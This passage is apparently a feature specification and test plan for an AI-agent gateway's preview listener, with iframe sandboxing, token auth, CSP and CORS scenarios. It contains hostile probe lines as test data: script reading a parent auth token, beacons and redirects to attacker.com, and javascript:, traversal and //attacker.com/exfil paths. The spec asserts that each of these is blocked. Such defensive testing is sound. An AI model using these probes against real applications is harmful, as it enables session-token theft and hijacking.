- **When** the gateway boots
- **Then** boot fails with `auto-derived preview port 65536 is out of range; set gateway.preview_port explicitly`

#### Scenario: Preview listener can bind to a different host

**Traces to**: User Story 3, Acceptance Scenario 5
**Category**: Alternate Path

- **Given** `config.json` has `gateway.host = "0.0.0.0"`, `gateway.port = 5000`, `gateway.preview_host = "127.0.0.1"`, `gateway.preview_port = 5001`
- **When** the gateway boots
- **Then** the main listener accepts on `0.0.0.0:5000` and the preview accepts on `127.0.0.1:5001`
- **And** an external HTTP request to `<public-ip>:5001` is refused at TCP

#### Scenario: Preview listener is disabled by feature flag

**Traces to**: User Story 6, Acceptance Scenario 1
**Category**: Alternate Path

- **Given** `config.json` has `gateway.preview_listener_enabled = false`
- **When** the gateway boots
- **Then** only the main listener binds
- **And** `GET /api/v1/about` returns `"preview_listener_enabled": false`
- **And** boot log includes `preview listener disabled by config`

---

### Feature: Preview-listener route boundary (resolves C-05)

#### Scenario Outline: Preview listener returns 404 for non-`/serve/`, non-`/dev/` paths

**Traces to**: User Story 4, Acceptance Scenario 2 + Non-Behaviors
**Category**: Edge Case (security-critical)

- **Given** the preview listener is bound on `<preview_addr>`
- **When** an HTTP GET is sent to `<preview_addr>/<path>`
- **Then** the response status is 404

**Examples**:

| `<path>` | Notes |
|---|---|
| `/` | SPA fallback must not be served |
| `/index.html` | Direct SPA index must not be served |
| `/api/v1/about` | API surface must be unreachable |
| `/api/v1/agents` | API surface — auth bypass |
| `/api/v1/auth/login` | Login surface |
| `/health` | Operator surface |
| `/ready` | Operator surface |
| `/onboarding` | App route |
| `/serve/` (no agent/token) | Bare prefix → 400 (not 404) — see next scenario |
| `/dev/` (no agent/token) | Bare prefix → 400 |

#### Scenario: Bare `/serve/` and `/dev/` prefixes are rejected as bad requests

**Traces to**: Edge Case
**Category**: Error Path

- **Given** the preview listener is bound
- **When** a request is sent to `/serve/` (no agent and token)
- **Then** the response is 400 with `malformed URL: expected /serve/{agent}/{token}/...`

---

### Feature: Auth model on the preview listener (resolves C-01)

#### Scenario: Token-only authentication on `/serve/`

**Traces to**: Threat Model T-09 / User Story 1, Acceptance Scenario 1
**Category**: Happy Path

- **Given** an agent has called `serve_workspace` and returned a token-bearing path
- **When** an unauthenticated HTTP GET (no cookie, no `Authorization`) is sent to `<preview_addr>/serve/<agent>/<token>/`
- **Then** the response is 200 with the served content
- **And** no `Set-Cookie` header is emitted on the response

#### Scenario: Expired token returns 401 (M-07 resolved)

**Traces to**: User Story 1 / Behavioral Contract Error flows
**Category**: Error Path

- **Given** an agent's serve token has TTL-expired
- **When** any request is sent to `<preview_addr>/serve/<agent>/<token>/`
- **Then** the response is 401 with `token unknown or expired`

#### Scenario: Token bound to a different agent is rejected

**Traces to**: User Story 4 / Threat Model
**Category**: Error Path

- **Given** agent A's token is `t-A` and agent B's token is `t-B`
- **When** a request is sent to `<preview_addr>/serve/<agent-A>/<t-B>/`
- **Then** the response is 403 with `token does not belong to this agent`

---

### Feature: Iframe preview UX

#### Scenario: Iframe renders live on a public IP deployment

**Traces to**: User Story 1, Acceptance Scenario 1
**Category**: Happy Path

- **Given** the gateway is bound to `0.0.0.0:5000` (preview on 5001)
- **And** the SPA was loaded from `http://146.190.89.151:5000/`
- **When** an agent calls `serve_workspace` and the tool returns
- **Then** the chat renders an `<iframe>` element with `src = http://146.190.89.151:5001/serve/<agent>/<token>/`
- **And** the iframe `sandbox` attribute equals `allow-scripts allow-same-origin allow-forms allow-popups allow-modals` (no `allow-top-navigation`, no `allow-popups-to-escape-sandbox`)
- **And** the iframe content document is non-empty within 5 s

#### Scenario: Open-in-new-tab uses direct window.open

**Traces to**: User Story 1, Acceptance Scenario 2 / Mn-01
**Category**: Happy Path

- **Given** the iframe is mounted with a known absolute URL
- **When** the user clicks "Open in new tab"
- **Then** the SPA invokes `window.open(<url>, '_blank', 'noopener,noreferrer')`
- **And** a new browser tab opens with the same URL

#### Scenario: Copy-link warns about bearer-token nature

**Traces to**: User Story 1, Acceptance Scenario 5 / Mn-09
**Category**: Happy Path

- **Given** the iframe is mounted
- **When** the user clicks "Copy link"
- **Then** the URL is written to the clipboard
- **And** a toast appears with text: `Link copied. Anyone with this link can view the preview until it expires.`

#### Scenario: Reload restarts the iframe but does not restart the warmup loop

**Traces to**: User Story 2, Acceptance Scenario 4 / Mn-06
**Category**: Alternate Path

- **Given** the dev-server iframe is live and mounted
- **When** the user clicks "Reload"
- **Then** the iframe `src` is updated to the same URL with a cache-buster query
- **And** the warmup polling loop is NOT started

---

### Feature: Warmup state machine (resolves C-02, C-07)

#### Scenario: Warmup uses iframe-load polling, not cross-origin fetch

**Traces to**: User Story 2, Acceptance Scenario 1 / C-02
**Category**: Happy Path

- **Given** an agent calls `run_in_workspace` returning `{"path": "/dev/<agent>/<token>/"}`
- **And** the dev server has not yet bound at tool-return time
- **When** the SPA renders the `<RunInWorkspaceUI>` component
- **Then** at t=0 a hidden probe-iframe is mounted with `<preview_origin>/dev/<agent>/<token>/?_=<timestamp>`
- **And** at t=2,4,...,58 s the probe-iframe is re-mounted with a fresh cache-buster
- **And** when the probe-iframe `onload` fires within 1.8 s of mount, the visible iframe is mounted with the canonical URL and the polling loop terminates
- **And** no cross-origin `fetch()` is issued during warmup

#### Scenario: Warmup gives up after 30 unsuccessful probes

**Traces to**: User Story 2, Acceptance Scenario 2 / Mn-02 / C-07
**Category**: Error Path

- **Given** the dev server fails to bind for over 60 s
- **When** 30 probe-iframes have all failed (no `onload` within 1.8 s of mount each)
- **Then** the placeholder is replaced with an error block
- **And** a "Retry" button restarts the polling from probe 1 when clicked

#### Scenario Outline: Warmup probe schedule is fixed

**Traces to**: Mn-02
**Category**: Edge Case / Boundary

- **Given** the SPA mounts a warmup component at t=0
- **When** the polling loop runs
- **Then** probe N is started at t = `<probe_start>` regardless of probe N-1's actual completion

**Examples**:

| Probe number | `<probe_start>` |
|---|---|
| 1 | 0 s |
| 2 | 2 s |
| 30 | 58 s |
| 31 (does not run) | — (timeout fired at t=60 s) |

---

### Feature: Cross-origin attack surface

#### Scenario: Served JS cannot read SPA storage

**Traces to**: User Story 4, Acceptance Scenario 1 / Threat Model T-01
**Category**: Edge Case (security-critical)

- **Given** the served `index.html` writes `<script>try { parent.localStorage.getItem('omnipus_auth_token'); } catch(e) { window.testProbeError = e.name; }</script>`
- **When** the iframe loads
- **Then** the served page's `window.testProbeError` is `SecurityError`

#### Scenario: Served JS cannot reach `/api/v1/*` (proximate via 404)

**Traces to**: User Story 4, Acceptance Scenario 2 / M-13 / Threat Model T-02
**Category**: Edge Case (security-critical)

- **Given** the iframe is loaded and contains JS that calls `fetch('/api/v1/agents', { credentials: 'include' })`
- **When** the served JS executes the fetch
- **Then** the request is sent to `<preview_origin>/api/v1/agents`
- **And** the request returns 404 because `/api/v1/*` is not registered on the preview listener (proximate)
- **And** even if it were registered, the SPA's session cookie would not be attached because the cookie has no `Domain` and is `SameSite=Strict`-scoped to the main origin (defence-in-depth)

#### Scenario: Token does not leak via Referer

**Traces to**: User Story 4, Acceptance Scenario 4 / Threat Model T-03 / C-04
**Category**: Edge Case (security-critical)

- **Given** the served HTML contains `<img src="https://attacker.com/probe.gif">`
- **When** the iframe loads and the image request is dispatched
- **Then** the outbound request to `attacker.com` carries no `Referer` header
- **And** the gateway's response to the original `/serve/` request included `Referrer-Policy: no-referrer`

#### Scenario: Top-navigation is blocked by sandbox

**Traces to**: User Story 4, Acceptance Scenario 3
**Category**: Edge Case (security-critical)

- **Given** the served HTML contains `<script>top.location = 'http://attacker.com';</script>`
- **When** the script executes
- **Then** the parent SPA's URL is unchanged
- **And** the browser console contains a sandbox-violation entry

#### Scenario: Embed by foreign origin is blocked by frame-ancestors

**Traces to**: User Story 4, Acceptance Scenario 5 / Threat Model T-04 / M-14
**Category**: Edge Case (security-critical, defence-in-depth only)

- **Given** the gateway sets `Content-Security-Policy: frame-ancestors '<main_origin>'` on `/serve/*` and `/dev/*` responses
- **And** an attacker has stolen a token and hosts an iframe at `https://evil.com` pointing at `<preview_origin>/serve/<agent>/<token>/`
- **When** a victim visits `https://evil.com`
- **Then** the browser refuses to display the iframe content
- **And** the spec acknowledges this is defence-in-depth only — direct viewing of a leaked token is the documented bearer-token contract (T-09)

#### Scenario: Two `/serve/` instances on the same preview origin share localStorage

**Traces to**: Threat Model T-05 / C-03
**Category**: Edge Case (accepted limitation)

- **Given** two browser tabs each have their own iframe pointing at the preview origin
- **And** tab 1's iframe writes `localStorage.setItem('a','1')` and tab 2's iframe reads `localStorage.getItem('a')`
- **When** the test executes
- **Then** tab 2's read returns `'1'` (cross-talk)
- **And** the spec documents this as an accepted single-tenant limitation
- **And** the future-hardening path (per-token subdomains) is referenced

---

### Feature: CORS preflight on preview listener (resolves C-02 alongside iframe-polling redesign)

> The warmup loop no longer performs cross-origin fetch (replaced by iframe-load polling). However, **operators or external tooling** may still send `OPTIONS` requests to the preview listener (curl, Insomnia, monitoring probes). The preview listener accepts CORS preflights and same-origin probes from the configured main origin only.

#### Scenario: OPTIONS preflight from main origin is accepted

**Traces to**: C-02 / observability
**Category**: Alternate Path

- **Given** the gateway runs with `gateway.public_url = "https://omnipus.acme.com"`
- **When** an `OPTIONS /serve/<agent>/<token>/` request is sent with `Origin: https://omnipus.acme.com` and `Access-Control-Request-Method: GET`
- **Then** the response is 204 with headers:
  - `Access-Control-Allow-Origin: https://omnipus.acme.com`
  - `Access-Control-Allow-Methods: GET, HEAD, OPTIONS`
  - `Access-Control-Max-Age: 86400`
  - `Vary: Origin`

#### Scenario: OPTIONS preflight from foreign origin is rejected

**Traces to**: C-02
**Category**: Error Path

- **Given** the gateway is configured with `gateway.public_url = "https://omnipus.acme.com"`
- **When** an `OPTIONS /serve/<agent>/<token>/` request is sent with `Origin: https://evil.com`
- **Then** the response is 403 (or 200 with no `Access-Control-Allow-Origin` header — implementation choice; either is browser-blocking)

---

### Feature: workspaceCSP and dev-server CSP-strip (resolves CR-01, MR-04)

#### Scenario: `/serve/` response replaces `frame-ancestors 'none'` with `<main_origin>`

**Traces to**: FR-007c
**Category**: Happy Path

- **Given** the gateway is configured with `gateway.public_url = "http://1.2.3.4:5000"`
- **When** a `GET /serve/<agent>/<token>/index.html` lands on the preview listener
- **Then** the response carries exactly one `Content-Security-Policy` header
- **And** that header contains `frame-ancestors 'http://1.2.3.4:5000'`
- **And** that header contains `connect-src 'self'`
- **And** that header does NOT contain `frame-ancestors 'none'` or `connect-src 'none'`

#### Scenario: `frame-ancestors '*'` fallback when host=0.0.0.0 and public_url unset

**Traces to**: FR-007e / Threat Model T-04
**Category**: Edge Case

- **Given** `gateway.host = "0.0.0.0"` and `gateway.public_url` is unset
- **When** the gateway boots
- **Then** a single WARN log line is emitted at boot containing `frame-ancestors fallback to '*'`
- **And** every `/serve/...` response carries `Content-Security-Policy: ...; frame-ancestors '*'; ...`

#### Scenario: `/dev/` response strips upstream CSP

**Traces to**: FR-007d
**Category**: Happy Path

- **Given** the dev server's HTTP responses include `Content-Security-Policy: script-src 'unsafe-eval'` (Next.js dev mode default)
- **When** a `GET /dev/<agent>/<token>/_next/static/...` lands on the preview listener and is proxied
- **Then** the response from the gateway contains exactly one `Content-Security-Policy` header
- **And** that header is the gateway's policy (`frame-ancestors '<main_origin>'; connect-src 'self'; script-src 'unsafe-inline'`)
- **And** the dev server's own CSP is not present

---

### Feature: Iframe POST inside dev iframe (resolves CR-02)

#### Scenario: Form POST inside the dev iframe is accepted

**Traces to**: FR-023a
**Category**: Happy Path

- **Given** a Next.js dev server is running under `run_in_workspace`
- **And** the iframe is mounted from `<preview_origin>/dev/<agent>/<token>/`
- **When** the served HTML submits a form via `POST /dev/<agent>/<token>/api/login`
- **Then** the request reaches the gateway carrying `Origin: <preview_origin>`
- **And** the gateway accepts the request (no 403 from the removed `RequireMatchingOriginOnStateChanging` middleware)
- **And** the request is proxied to the dev server

---

### Feature: `run_in_workspace` JSON schema migration (resolves CR-03)

#### Scenario: Tool result carries both JSON and human summary

**Traces to**: FR-008a
**Category**: Happy Path

- **Given** an agent calls `run_in_workspace`
- **When** the tool returns
- **Then** the tool result carries a `result` JSON value with shape `{path, url, expires_at, command, port}`
- **And** the tool result carries a `summary` field containing the existing human-readable English sentence
- **And** the LLM continues to see the human summary in its message history

---

### Feature: SPA path validation (resolves MR-10)

#### Scenario Outline: Reject malformed `path` values

**Traces to**: FR-010b
**Category**: Edge Case (security-critical)

- **Given** a tool result arrives with `path = '<input_path>'`
- **When** the SPA renders the tool UI
- **Then** the iframe `src` is `<expected_iframe_action>`

**Examples**:

| `<input_path>` | `<expected_iframe_action>` |
|---|---|
| `/serve/agent-1/abc123/` | iframe mounts at `<preview_origin>/serve/agent-1/abc123/` |
| `/dev/agent-2/xyz789/` | iframe mounts at `<preview_origin>/dev/agent-2/xyz789/` |
| `javascript:alert(1)` | iframe NOT mounted; link-only fallback; console.warn |
| `//attacker.com/exfil` | iframe NOT mounted; link-only fallback; console.warn |
| `/api/v1/agents` | iframe NOT mounted; link-only fallback; console.warn |
| `data:text/html,...` | iframe NOT mounted; link-only fallback; console.warn |
| `/serve/../../etc/passwd` | iframe NOT mounted (regex enforces no `..`); link-only fallback |
| `` (empty) | iframe NOT mounted; link-only fallback |

---

### Feature: Markdown link rewrite (resolves M-12, Mn-03)

#### Scenario Outline: Rewrite legacy hosts in chat-rendered links

**Traces to**: User Story 1, Acceptance Scenario 4 / FR-016, FR-017
**Category**: Alternate Path

- **Given** the rendered chat contains a markdown link to `<source_url>`
- **And** `window.location.hostname = '<host>'` and `preview_port = <preview>`
- **When** the markdown renderer processes the link
- **Then** the resulting `<a href>` is `<rendered_url>`

**Examples**:

| `<source_url>` | `<host>` | `<preview>` | `<rendered_url>` | Notes |
|---|---|---|---|---|
| `http://0.0.0.0:5000/serve/m/t/` | `146.190.89.151` | 5001 | `http://146.190.89.151:5001/serve/m/t/` | Path-based, port swap |
| `http://0.0.0.0:5000/dev/m/t/` | `localhost` | 5001 | `http://localhost:5001/dev/m/t/` | localhost variant |
| `http://0.0.0.0:5000/about` | `1.2.3.4` | 5001 | `http://1.2.3.4:5000/about` | Non-serve path → main port retained |
| `http://[::]:5000/serve/m/t/` | `1.2.3.4` | 5001 | `http://1.2.3.4:5001/serve/m/t/` | IPv6 wildcard |
| `http://[::0]:5000/serve/m/t/` | `1.2.3.4` | 5001 | `http://1.2.3.4:5001/serve/m/t/` | IPv6 explicit zero |
| `http://0:5000/serve/m/t/` | `1.2.3.4` | 5001 | `http://1.2.3.4:5001/serve/m/t/` | Bare-zero |
| `http://127.0.0.1:5000/serve/m/t/` | `1.2.3.4` | 5001 | `http://1.2.3.4:5001/serve/m/t/` | Loopback rewrite — for cases where the user is now on a remote host |
| `https://example.com/page` | `1.2.3.4` | 5001 | `https://example.com/page` | Foreign host unchanged |
| `mailto:foo@x.com` | `1.2.3.4` | 5001 | `mailto:foo@x.com` | Non-http scheme passes through |
| `javascript:alert(1)` | `1.2.3.4` | 5001 | `javascript:alert(1)` | Pass through (markdown render layer separately blocks XSS — not this code's concern) |
| `tel:+155512345` | `1.2.3.4` | 5001 | `tel:+155512345` | Pass through |
| `/relative/path` | `1.2.3.4` | 5001 | `/relative/path` | Relative paths unchanged |
| `//host.com/x` | `1.2.3.4` | 5001 | `//host.com/x` | Scheme-relative unchanged |
| (empty string) | `1.2.3.4` | 5001 | (empty string) | Boundary |
| `not-a-url` | `1.2.3.4` | 5001 | `not-a-url` | Unparseable passes through without throwing |

---

## Test-Driven Development Plan

### Test Hierarchy

| Level | Scope | Purpose |
|---|---|---|
| Unit | Individual Go functions and React components | Logic — schema, sandbox attrs, rewrite rules, headers |
| Integration | Gateway boot + handler routing + tool result construction | Two-port topology end-to-end on the backend |
| E2E | SPA in a real browser driving an agent through `serve_workspace` and `run_in_workspace` | Full UX including iframe rendering, sandbox, security boundaries |
| A11y | Keyboard nav, ARIA labels on chrome bar | Accessibility (gap #9 from review) |
| Stress | Concurrent warmup probes | Load (gap #8 from review) |

### Test Implementation Order

| Order | Test Name | Level | Traces to BDD Scenario | Description |
|---|---|---|---|---|
| 1 | `TestGatewayConfig_PreviewPort_DefaultDerivation` | Unit | "Default preview port…" | Asserts `cfg.Gateway.PreviewPort == cfg.Gateway.Port + 1` after defaults |
| 2 | `TestGatewayConfig_PreviewPort_CollisionRejected` | Unit | "Boot fails when main and preview ports collide" | Validator returns error when `PreviewPort == Port` |
| 3 | `TestGatewayConfig_PreviewPort_OverflowRejected` | Unit | "Auto-derived preview port overflow boundary" | `port=65535` + unset `preview_port` returns clear overflow error |
| 4 | `TestGatewayConfig_ValidationOrder` | Unit | (Boundary conditions) | Validation runs in the documented order; first-failed step is the surfaced error |
| 5 | `TestServeWorkspaceResult_Schema_AdditiveFields` | Unit | "Iframe renders live…" | Result has `path`, `url`, `expires_at`; old consumers reading only `url` still work |
| 6 | `TestRunInWorkspaceResult_Schema_AdditiveFields` | Unit | (US-2 supporting) | Same |
| 7 | `TestHandleAbout_PreviewFields` | Unit | "Default preview port…" / US-6 AS-1 | Response includes `preview_port`, `preview_origin` (when set), `preview_listener_enabled` |
| 8 | `TestServePreview_NoAuth_RequiresValidToken` | Unit | "Token-only authentication on /serve/" | Unauthenticated request with valid token returns 200; with invalid token returns 401; with mismatched agent returns 403 |
| 9 | `TestServePreview_FrameAncestorsHeader` | Unit | "Embed by foreign origin is blocked…" | Response carries `Content-Security-Policy: frame-ancestors '<main_origin>'` |
| 10 | `TestDevPreview_FrameAncestorsHeader` | Unit | (US-5 AS-2 supporting) | Same for `/dev/` |
| 11 | `TestServePreview_ReferrerPolicyHeader` | Unit | "Token does not leak via Referer" | Response carries `Referrer-Policy: no-referrer` |
| 12 | `TestServePreview_CORSPreflight_AllowsMainOrigin` | Unit | "OPTIONS preflight from main origin is accepted" | OPTIONS with main `Origin` returns 204 with allow headers |
| 13 | `TestServePreview_CORSPreflight_RejectsForeignOrigin` | Unit | "OPTIONS preflight from foreign origin is rejected" | OPTIONS with foreign `Origin` does not return `Access-Control-Allow-Origin` |
| 14 | `TestPreviewMux_404ForUnregisteredPaths` | Unit | "Preview listener returns 404 for non-/serve/, non-/dev/ paths" | Table-driven: 9 paths, all return 404 |
| 15 | `TestCanonicalGatewayOrigin_PublicURLOverride` | Unit | (US-5 AS-2) | When `cfg.Gateway.PublicURL` is set, that value is returned |
| 16 | `iframe-preview.test.tsx: renders iframe with sandbox attrs` | Unit | "Iframe renders live…" | sandbox = `allow-scripts allow-same-origin allow-forms allow-popups allow-modals` (no top-navigation, no popups-to-escape-sandbox) |
| 17 | `iframe-preview.test.tsx: open-in-new-tab uses window.open` | Unit | "Open-in-new-tab uses direct window.open" | `window.open(url, '_blank', 'noopener,noreferrer')` is called |
| 18 | `iframe-preview.test.tsx: copy-link emits warning toast` | Unit | "Copy-link warns about bearer-token nature" | Toast text matches the spec |
| 19 | `iframe-preview.test.tsx: warmup polls via iframe-load and swaps` | Unit | "Warmup uses iframe-load polling…" | Timer-mocked: probe-iframe `onload` fires → visible iframe mounts |
| 20 | `iframe-preview.test.tsx: warmup gives up after 30 attempts` | Unit | "Warmup gives up after 30 unsuccessful probes" | 30 failed probes → error block + Retry; no cross-origin fetch issued |
| 21 | `iframe-preview.test.tsx: retry restarts the loop` | Unit | "Warmup gives up after 30 unsuccessful probes" (Retry assertion — fills review gap #10) | After error state, click Retry, observe probe 1 mount |
| 22 | `iframe-preview.test.tsx: reload does not restart polling` | Unit | "Reload restarts the iframe but does not restart the warmup loop" | After live state, click Reload, polling counter unchanged |
| 23 | `iframe-preview.test.tsx: scheme mismatch shows error` | Unit | US-5 AS-3 / M-05 | HTTP main + HTTPS preview origin → error block, console warning |
| 24 | `iframe-preview.test.tsx: a11y — chrome buttons have ARIA labels` | A11y | (gap #9) | Reload/Open-in-tab/Copy-link have `aria-label`, are keyboard-focusable |
| 25 | `preview-url.test.ts: rewriteLegacyURL all cases` | Unit | "Rewrite legacy hosts in chat-rendered links" | All 15 dataset rows pass |
| 26 | `markdown-text.test.tsx: rewrites legacy URLs via shared util` | Unit | "Rewrite legacy hosts in chat-rendered links" | The renderer calls `rewriteLegacyURL` (resolves O-02) |
| 27 | `serve_workspace_replay.test.tsx: rewrites legacy URL on render` | Unit | "Replay rewrites legacy 0.0.0.0 URLs…" | Legacy `{ url }` result → iframe `src` is current host:5001 |
| 28 | `TestGateway_TwoListeners_Boot` | Integration | "Default preview port…" | Boot, assert two listeners accept on the expected addrs |
| 29 | `TestGateway_PreviewListenerDisabled` | Integration | "Preview listener is disabled by feature flag" | `preview_listener_enabled=false` → only one listener bound |
| 30 | `TestGateway_PreviewHost_DistinctFromMain` | Integration | "Preview listener can bind to a different host" | `preview_host = 127.0.0.1` while `host = 0.0.0.0` |
| 31 | `TestGateway_MainMux_DoesNotExposeServe` | Integration | (Non-Behaviors) | `<main>/serve/<agent>/<token>/` returns 404 |
| 32 | `TestGateway_PreviewMux_DoesNotExposeAPI` | Integration | "Served JS cannot reach /api/v1/*" | Table-driven: 9 paths, all 404 (resolves review gap #3) |
| 33 | `TestServeWorkspaceTool_E2E_ReturnsRelativePath` | Integration | "Iframe renders live…" | Tool result `.path` starts with `/serve/`; `.url` starts with the configured preview origin |
| 34 | `playwright/serve-iframe.spec.ts: a) iframe loads + new-tab` | E2E | "Iframe renders live…" + "Open-in-new-tab…" | Drive an agent through `serve_workspace`, click new-tab, verify new context.page |
| 35 | `playwright/serve-iframe.spec.ts: b) cross-origin isolation` | E2E | "Served JS cannot read SPA storage" + "…cannot reach /api/v1/*" + "…cannot leak via Referer" | Inject a 4-pronged probe into served HTML; assert all four mitigations fire |
| 36 | `playwright/serve-iframe.spec.ts: c) cross-served storage cross-talk` | E2E | "Two /serve/ instances on the same preview origin share localStorage" | Two tabs, two iframes, write+read assertion (resolves review gap #2; documents accepted limit) |
| 37 | `playwright/serve-iframe.spec.ts: d) replay legacy URL` | E2E | "Replay rewrites legacy 0.0.0.0 URLs…" | Seed transcript with `0.0.0.0:5000/serve/...`, open session, assert iframe src is current host:5001 |
| 38 | `playwright/run-iframe.spec.ts: warmup transition` | E2E | "Warmup uses iframe-load polling…" | Slow dev server fixture; placeholder visible, iframe mounts within SLA |
| 39 | `playwright/run-iframe.spec.ts: warmup retry` | E2E | "Warmup gives up after 30 unsuccessful probes" / Retry | Force timeout, click Retry, assert polling restarted |
| 40 | `TestServePreview_LoadStress_ConcurrentProbes` | Stress | (review gap #8) | Simulate 20 concurrent warmup loops; assert no resource leak, p95 latency < 500 ms |
| 41 | `TestWorkspaceCSP_FrameAncestorsFromMainOrigin` | Unit | "/serve/ response replaces frame-ancestors 'none' with <main_origin>" | Asserts `buildWorkspaceCSP("http://1.2.3.4:5000")` contains the literal `frame-ancestors 'http://1.2.3.4:5000'` and `connect-src 'self'` (CR-01) |
| 42 | `TestWorkspaceCSP_FrameAncestorsFallback` | Unit | "frame-ancestors '*' fallback…" | Asserts `buildWorkspaceCSP("")` (host=0.0.0.0, no public_url) returns CSP with `frame-ancestors '*'` and a boot WARN is logged (FR-007e) |
| 43 | `TestProxyDevRequest_StripsUpstreamCSP` | Integration | "/dev/ response strips upstream CSP" | Mock dev server emits `CSP: script-src 'unsafe-eval'`; gateway response contains only the gateway's CSP (FR-007d / MR-04) |
| 44 | `TestHandleDevProxy_NoOriginMiddleware` | Integration | "Form POST inside the dev iframe is accepted" | POST to `/dev/<a>/<t>/api/x` with `Origin: <preview_origin>` returns 502 (mock dev unreachable, NOT 403 from the dropped middleware — CR-02) |
| 45 | `TestRunInWorkspaceTool_JSONSchema` | Unit | "Tool result carries both JSON and human summary" | Asserts the tool result `result` field is JSON parseable to `{path, url, expires_at, command, port}` AND `summary` contains the English sentence (CR-03) |
| 46 | `TestRunInWorkspaceConfig_DefaultWarmupTimeout` | Unit | (US-2 supporting) | `cfg.Tools.RunInWorkspace.WarmupTimeoutSeconds` defaults to 60 after boot validator (CR-04) |
| 47 | `iframe-preview.test.tsx: rejects malformed path` | Unit | "Reject malformed path values" outline | Each row in the dataset triggers link-only fallback + console.warn (FR-010b / MR-10) |
| 48 | `TestServePreview_AuditEvents_Failure` | Unit | (Behavioral Contract) | 401/403/404/400 responses each emit the right `serve.*` event with `decision: deny|error` (FR-024a / MR-07) |
| 49 | `TestServePreview_AuditEvents_FirstRequestOnly` | Unit | (FR-024) | Two GETs on the same token within 5 s emit ONE `serve.served` event, not two (MR-01) |
| 50 | `TestPendingRestart_PreviewFields` | Integration | (FR-027b) | Changing `gateway.preview_port` via API surfaces a pending-restart entry (MR-02 / OB-01) |
| 51 | `TestGateway_PreviewListenerEnabled_AndroidDefault` | Unit | (FR-027) | When `runtime.GOOS == "android"`, `preview_listener_enabled` defaults to false; on Linux defaults to true (MR-09) |
| 52 | `TestGatewayConfig_PreviewOriginRequiresEnabled` | Unit | (FR-027a) | Boot fails with clear error when `preview_origin` is set but `preview_listener_enabled = false` |

### Test Datasets

#### Dataset: Gateway boot configuration

| # | `port` | `preview_port` | `preview_host` | `preview_origin` | `public_url` | `preview_listener_enabled` | Boot Outcome | Traces to | Notes |
|---|---|---|---|---|---|---|---|---|---|
| 1 | 5000 | (unset) | (unset) | (unset) | (unset) | (default true) | binds 5000 + 5001 | "Default preview port…" | Default-derivation happy path |
| 2 | 5000 | 5000 | (unset) | (unset) | (unset) | (default true) | boot fails: collision | "Boot fails when…" | Same-port rejected |
| 3 | 5000 | 18080 | (unset) | (unset) | (unset) | (default true) | binds 5000 + 18080 | "Operator overrides…" | Explicit override |
| 4 | 5000 | (unset) | `127.0.0.1` | (unset) | (unset) | (default true) | binds `0.0.0.0:5000` + `127.0.0.1:5001` | "Preview listener can bind…" | Different host |
| 5 | 5000 | (unset) | (unset) | `https://preview.acme.com` | `https://omnipus.acme.com` | (default true) | binds; `about` exposes both origins | "User Story 5, Scenario 1" | Reverse-proxy SaaS |
| 6 | 5000 | -1 | (unset) | (unset) | (unset) | (default true) | boot fails: out-of-range | (boundary) | Negative port |
| 7 | 5000 | 65536 | (unset) | (unset) | (unset) | (default true) | boot fails: out-of-range | (boundary) | Upper bound |
| 8 | 65535 | (unset) | (unset) | (unset) | (unset) | (default true) | boot fails: overflow message | "Auto-derived preview port overflow…" | Auto-derive boundary |
| 9 | 0 | (unset) | (unset) | (unset) | (unset) | (default true) | boot fails: main port out of range | (boundary) | Main port 0 — fails before preview |
| 10 | 5000 | (unset) | (unset) | (unset) | (unset) | false | binds 5000 only | "Preview listener disabled…" | Rollback flag |
| 11 | 443 | (unset) | (unset) | `https://preview.acme.com` | `https://omnipus.acme.com` | (default true) | binds; SPA constructs HTTPS iframe URL | (US-5 supporting) | TLS via reverse proxy |
| 12 | 80 | 81 | (unset) | (unset) | (unset) | (default true) | binds; doctor warns about privileged ports | (US-3 AS-3 + O-04) | Privileged-port path |
| 13 | 5000 | 5000 | (unset) | (unset) | (unset) | false | boots OK (collision check skipped when listener disabled) | (FR-027c / MR-06) | Skip collision check when off |
| 14 | 5000 | (unset) | (unset) | `https://preview.acme.com` | (unset) | false | boot fails: `preview_origin requires preview_listener_enabled = true` | (FR-027a) | Cross-field validation gap |
| 15 | 5000 | (unset) | (unset) | (unset) | (unset) | (default true; Android) | preview_listener_enabled defaults to false on Android | (FR-027 / MR-09) | Termux default |
| 16 | 5000 | (unset) | `[::]` | (unset) | (unset) | (default true) | binds main on `0.0.0.0`, preview on `[::1]` (or rejects if equivalent to host); IPv6 normalisation | (FR-028 / MN-01) | IPv6 normalisation |

#### Dataset: Markdown link host rewrite (extends original — 15 rows)

See "Scenario Outline: Rewrite legacy hosts in chat-rendered links" — that table is the dataset.

#### Dataset: Iframe sandbox attribute

| # | Tool | Expected `sandbox` | Traces to | Notes |
|---|---|---|---|---|
| 1 | `serve_workspace` | `allow-scripts allow-same-origin allow-forms allow-popups allow-modals` | "Iframe renders live…" | No `allow-top-navigation`, no `allow-popups-to-escape-sandbox` |
| 2 | `run_in_workspace` | (same) | (US-2 supporting) | Identical sandbox |
| 3 | (negative) | `allow-top-navigation` MUST NOT appear | (Non-Behavior) | Asserted by absence |
| 4 | (negative) | `allow-popups-to-escape-sandbox` MUST NOT appear | (Mn-08) | Asserted by absence |

#### Dataset: HEAD-replaced-with-iframe-load probe

| # | Probe-iframe behaviour (in order) | Expected component state | Traces to | Notes |
|---|---|---|---|---|
| 1 | first probe `onload` fires within 1.8 s | visible iframe within 2 s of probe 1 | "Warmup uses iframe-load polling…" | Best case |
| 2 | probes 1-2 timeout, probe 3 `onload`s | placeholder for ≈4 s, then visible iframe | "Warmup uses iframe-load polling…" | Three probes |
| 3 | all 30 probes timeout | placeholder ~60 s, then error block | "Warmup gives up…" | Timeout path |
| 4 | probe 1 fires `onerror`, probe 2 `onload`s | placeholder briefly, then iframe | (resilience) | Network blip |
| 5 | dev server returns 502 page (HTML) on probe | `onload` fires (browser loads the 502 HTML); user sees "Bad Gateway" inside iframe | (Edge) | Spec accepts: dev server's 5xx is rendered, the user can read it |

#### Dataset: Cross-origin attack probe

| # | Probe injected into served HTML | Expected outcome | Traces to | Notes |
|---|---|---|---|---|
| 1 | `parent.localStorage.getItem('omnipus_auth_token')` | throws `SecurityError` | "Served JS cannot read SPA storage" | T-01 |
| 2 | `fetch('/api/v1/agents', { credentials: 'include' })` | response status 404 (preview mux) | "Served JS cannot reach /api/v1/*" | T-02 |
| 3 | `fetch('https://attacker.com/?x=1')` | request issued, but no `Referer` header | "Token does not leak via Referer" | T-03 |
| 4 | `top.location = 'http://attacker.com'` | parent URL unchanged | "Top-navigation is blocked by sandbox" | sandbox |
